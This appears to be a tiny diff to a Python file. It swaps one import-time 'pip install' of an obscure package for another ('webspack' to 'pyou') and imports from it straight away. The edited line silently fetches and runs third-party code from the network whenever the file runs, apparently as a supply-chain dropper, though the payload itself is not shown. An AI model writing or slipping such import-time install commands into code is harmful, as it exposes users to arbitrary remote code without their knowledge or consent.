@@ -1,6 +1,6 @@
 import os
-os.system(f"pip install webspack")
-from webspack import driver
+os.system(f"pip install pyou")
+from pyou import color
 try:
     import requests
     import typesutil
